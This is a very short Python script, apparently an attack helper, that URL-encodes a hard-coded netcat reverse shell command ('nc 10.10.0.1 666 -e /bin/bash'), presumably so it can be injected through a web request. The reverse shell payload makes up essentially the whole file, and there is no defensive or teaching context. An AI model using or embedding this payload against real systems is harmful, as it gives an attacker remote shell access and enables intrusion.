#simple url enconder

import urllib.request as req
string = 'nc 10.10.0.1 666 -e /bin/bash'
print (req.pathname2url(string))

